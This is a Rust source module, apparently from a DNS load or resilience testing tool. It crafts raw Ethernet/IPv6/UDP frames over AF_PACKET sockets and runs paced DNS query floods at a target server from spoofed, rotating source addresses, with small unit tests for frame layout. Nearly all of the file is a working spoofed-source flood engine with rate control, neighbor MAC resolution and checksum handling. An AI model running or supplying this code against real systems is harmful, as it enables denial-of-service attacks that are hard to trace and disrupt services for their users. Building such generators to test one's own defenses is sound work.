//! IPv6 spoofed flood over AF_PACKET (L2); Linux has no IPV6_HDRINCL, so we build the whole frame.
#![allow(unsafe_code)]

use std::ffi::{CStr, CString};
use std::net::{IpAddr, Ipv6Addr, SocketAddr, UdpSocket};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};

use anyhow::{Context, Result, bail};

use segfault_gen::{Rng, Scenario, encode_query, flood_qname, flood_src6};

const ETH_P_IPV6: u16 = 0x86DD;

/// Link facts needed to send a spoofed frame toward the server.
pub struct Link {
    ifindex: i32,
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
}

/// Adds a byte slice into a 16-bit one's-complement running sum.
fn sum16(s: &mut u32, b: &[u8]) {
    let mut i = 0;
    while i + 1 < b.len() {
        *s += ((b[i] as u32) << 8) | b[i + 1] as u32;
        i += 2;
    }
    if i < b.len() {
        *s += (b[i] as u32) << 8;
    }
}

/// Mandatory IPv6 UDP checksum over the pseudo-header + UDP segment.
fn udp6_checksum(src: &[u8; 16], dst: &[u8; 16], udp: &[u8]) -> u16 {
    let mut sum = 0u32;
    sum16(&mut sum, src);
    sum16(&mut sum, dst);
    let ln = udp.len() as u32;
    sum += (ln >> 16) & 0xffff;
    sum += ln & 0xffff;
    sum += 17; // next header = UDP, with the three leading zero bytes contributing nothing
    sum16(&mut sum, udp);
    while sum >> 16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    let c = !sum as u16;
    if c == 0 { 0xffff } else { c }
}

/// Builds an Ethernet + IPv6 + UDP + DNS frame into out; returns its length.
pub fn build_frame6(
    out: &mut [u8],
    l: &Link,
    src: Ipv6Addr,
    dst: Ipv6Addr,
    sport: u16,
    dns: &[u8],
) -> usize {
    let udp_len = 8 + dns.len();
    // Ethernet header.
    out[0..6].copy_from_slice(&l.dst_mac);
    out[6..12].copy_from_slice(&l.src_mac);
    out[12..14].copy_from_slice(&ETH_P_IPV6.to_be_bytes());
    // IPv6 header.
    let ip = 14;
    out[ip] = 0x60; // version 6
    out[ip + 1] = 0;
    out[ip + 2] = 0;
    out[ip + 3] = 0;
    out[ip + 4..ip + 6].copy_from_slice(&(udp_len as u16).to_be_bytes());
    out[ip + 6] = 17; // next header = UDP
    out[ip + 7] = 64; // hop limit
    out[ip + 8..ip + 24].copy_from_slice(&src.octets());
    out[ip + 24..ip + 40].copy_from_slice(&dst.octets());
    // UDP header + payload.
    let u = ip + 40;
    out[u..u + 2].copy_from_slice(&sport.to_be_bytes());
    out[u + 2..u + 4].copy_from_slice(&53u16.to_be_bytes());
    out[u + 4..u + 6].copy_from_slice(&(udp_len as u16).to_be_bytes());
    out[u + 6..u + 8].copy_from_slice(&[0, 0]);
    out[u + 8..u + 8 + dns.len()].copy_from_slice(dns);
    let ck = udp6_checksum(&src.octets(), &dst.octets(), &out[u..u + udp_len]);
    out[u + 6..u + 8].copy_from_slice(&ck.to_be_bytes());
    u + udp_len
}

/// Opens an AF_PACKET raw socket for sending IPv6 frames.
fn open_packet() -> Result<i32> {
    let proto = (ETH_P_IPV6.to_be()) as i32;
    let fd = unsafe { libc::socket(libc::AF_PACKET, libc::SOCK_RAW, proto) };
    if fd < 0 {
        return Err(std::io::Error::last_os_error())
            .context("AF_PACKET socket (IPv6 spoofing needs CAP_NET_RAW)");
    }
    Ok(fd)
}

/// Sends one frame out ifindex toward dst_mac.
fn send_frame(fd: i32, l: &Link, frame: &[u8]) -> isize {
    let mut sa: libc::sockaddr_ll = unsafe { std::mem::zeroed() };
    sa.sll_family = libc::AF_PACKET as u16;
    sa.sll_protocol = ETH_P_IPV6.to_be();
    sa.sll_ifindex = l.ifindex;
    sa.sll_halen = 6;
    sa.sll_addr[..6].copy_from_slice(&l.dst_mac);
    unsafe {
        libc::sendto(
            fd,
            frame.as_ptr() as *const libc::c_void,
            frame.len(),
            0,
            &sa as *const _ as *const libc::sockaddr,
            std::mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t,
        )
    }
}

/// Parses "00:15:5d:aa:bb:cc" into six bytes.
fn parse_mac(s: &str) -> Option<[u8; 6]> {
    let mut m = [0u8; 6];
    let mut n = 0;
    for part in s.split(':') {
        if n >= 6 {
            return None;
        }
        m[n] = u8::from_str_radix(part, 16).ok()?;
        n += 1;
    }
    (n == 6).then_some(m)
}

/// Finds the interface that owns `src` and reads its MAC, both from one getifaddrs pass.
fn iface_for_v6(src: Ipv6Addr) -> Result<(String, [u8; 6])> {
    use std::collections::HashMap;
    let mut ifap: *mut libc::ifaddrs = std::ptr::null_mut();
    if unsafe { libc::getifaddrs(&mut ifap) } != 0 {
        return Err(std::io::Error::last_os_error()).context("getifaddrs");
    }
    let mut target: Option<String> = None;
    let mut macs: HashMap<String, [u8; 6]> = HashMap::new();
    let mut cur = ifap;
    while !cur.is_null() {
        let ifa = unsafe { &*cur };
        if !ifa.ifa_addr.is_null() {
            let name = unsafe { CStr::from_ptr(ifa.ifa_name) }
                .to_string_lossy()
                .into_owned();
            let fam = unsafe { (*ifa.ifa_addr).sa_family } as i32;
            if fam == libc::AF_INET6 {
                let s6 = unsafe { &*(ifa.ifa_addr as *const libc::sockaddr_in6) };
                if s6.sin6_addr.s6_addr == src.octets() {
                    target = Some(name);
                }
            } else if fam == libc::AF_PACKET {
                let ll = unsafe { &*(ifa.ifa_addr as *const libc::sockaddr_ll) };
                if ll.sll_halen == 6 {
                    let mut m = [0u8; 6];
                    m.copy_from_slice(&ll.sll_addr[..6]);
                    macs.insert(name, m);
                }
            }
        }
        cur = ifa.ifa_next;
    }
    unsafe { libc::freeifaddrs(ifap) };
    let name = target.context("no interface owns the source IPv6 address")?;
    let mac = *macs
        .get(&name)
        .context("could not read the interface MAC address")?;
    Ok((name, mac))
}

/// Resolves the server's MAC from the neighbor table (after priming), retrying briefly.
fn neigh_mac(server: Ipv6Addr) -> Result<[u8; 6]> {
    for _ in 0..15 {
        let out = std::process::Command::new("ip")
            .args(["-6", "neigh", "show", "to", &server.to_string()])
            .output();
        if let Ok(o) = out {
            let s = String::from_utf8_lossy(&o.stdout);
            if let Some(mac) = s
                .split_whitespace()
                .skip_while(|t| *t != "lladdr")
                .nth(1)
                .and_then(parse_mac)
            {
                return Ok(mac);
            }
        }
        std::thread::sleep(Duration::from_millis(200));
    }
    bail!("could not resolve neighbor MAC for {server} (is the server reachable over IPv6?)")
}

/// Resolves ifindex, our MAC and the server's MAC for reaching `server`.
fn resolve_link(server: Ipv6Addr) -> Result<Link> {
    let sock = UdpSocket::bind("[::]:0").context("bind udp6")?;
    sock.connect(SocketAddr::new(IpAddr::V6(server), 53))
        .context("connect udp6 (no IPv6 route to server?)")?;
    let src = match sock.local_addr()?.ip() {
        IpAddr::V6(a) => a,
        _ => bail!("expected an IPv6 source address"),
    };
    // Prime neighbor discovery so the server's MAC is in the table.
    let _ = sock.send(&[0u8; 12]);
    let (ifname, src_mac) = iface_for_v6(src)?;
    let cname = CString::new(ifname.clone())?;
    let ifindex = unsafe { libc::if_nametoindex(cname.as_ptr()) } as i32;
    if ifindex == 0 {
        bail!("if_nametoindex failed for {ifname}");
    }
    let dst_mac = neigh_mac(server)?;
    Ok(Link {
        ifindex,
        src_mac,
        dst_mac,
    })
}

/// Fails fast if the IPv6 link cannot be resolved or AF_PACKET cannot be opened.
pub fn check(server: Ipv6Addr) -> Result<()> {
    let fd = open_packet()?;
    unsafe { libc::close(fd) };
    resolve_link(server).map(|_| ())
}

/// Runs one IPv6 spoofed flood at a target pps; returns packets sent.
#[allow(clippy::too_many_arguments)]
pub fn flood6(
    dst: Ipv6Addr,
    sc: Scenario,
    pps: u64,
    dur: Duration,
    seed: u64,
    adaptive_src_pps: u64,
    sent: Arc<AtomicU64>,
    stop: Arc<AtomicBool>,
) -> Result<u64> {
    let link = resolve_link(dst)?;
    let fd = open_packet()?;
    let mut rng = Rng::new(seed);
    let mut dnsbuf = [0u8; 512];
    let mut frame = [0u8; 700];
    let distinct = (pps / adaptive_src_pps.max(1)).max(1);
    let start = Instant::now();
    let mut i = 0u64;
    let mut local = 0u64;

    while start.elapsed() < dur && !stop.load(Ordering::Relaxed) {
        // Pace to the target pps: if ahead of schedule, wait briefly (accurate at any rate).
        if local >= (pps as f64 * start.elapsed().as_secs_f64()) as u64 {
            std::thread::sleep(Duration::from_micros(100));
            continue;
        }
        let name = flood_qname(sc, &mut rng, i);
        let id = rng.next() as u16;
        let n = encode_query(&mut dnsbuf, id, &name);

        // Adaptive rotates over many sources inside 2001:db8::/32; others use flood_src6.
        let src = if sc == Scenario::Adaptive {
            let k = (i % distinct) as u16;
            Ipv6Addr::new(0x2001, 0x0db8, 0, 0, 0, 0, (k >> 8) & 0xff, k | 1)
        } else {
            flood_src6(sc, dst, &mut rng)
        };
        let sport = 1024 + (rng.next() as u16 % 60000);
        let len = build_frame6(&mut frame, &link, src, dst, sport, &dnsbuf[..n]);
        send_frame(fd, &link, &frame[..len]);

        local += 1;
        sent.fetch_add(1, Ordering::Relaxed);
        i += 1;
    }
    unsafe { libc::close(fd) };
    Ok(local)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mac_parse_roundtrip() {
        assert_eq!(
            parse_mac("00:15:5d:aa:bb:cc"),
            Some([0x00, 0x15, 0x5d, 0xaa, 0xbb, 0xcc])
        );
        assert_eq!(parse_mac("nope"), None);
    }

    #[test]
    fn frame_layout_and_checksum() {
        let l = Link {
            ifindex: 1,
            src_mac: [1, 2, 3, 4, 5, 6],
            dst_mac: [7, 8, 9, 10, 11, 12],
        };
        let mut out = [0u8; 700];
        let dns = [0xabu8; 30];
        let src = "2001:db8::1".parse().unwrap();
        let dst = "fd53::10".parse().unwrap();
        let len = build_frame6(&mut out, &l, src, dst, 5000, &dns);
        assert_eq!(len, 14 + 40 + 8 + 30);
        assert_eq!(&out[12..14], &[0x86, 0xDD]); // ethertype IPv6
        assert_eq!(out[14], 0x60); // version 6
        assert_eq!(out[14 + 6], 17); // next header UDP
        // UDP checksum must be non-zero (mandatory for IPv6).
        let u = 14 + 40;
        assert_ne!(&out[u + 6..u + 8], &[0, 0]);
    }
}
